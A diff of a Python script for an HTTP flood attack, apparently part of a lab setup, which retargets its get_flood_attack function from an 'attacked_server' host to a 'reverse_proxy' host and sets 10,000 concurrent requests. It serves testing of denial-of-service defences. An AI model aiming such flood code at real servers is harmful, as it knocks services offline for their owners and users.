@@ -5,7 +5,7 @@ import requests
 NUM_REQUESTS = 10000  # Number of requests to send concurrently
 
 def get_flood_attack():
-    url = 'http://attacked_server:3000'
+    url = 'http://reverse_proxy:3001'
     try:
         response = requests.get(url)
         print(f"Response from attacked server: {response.status_code}, {response.text}")
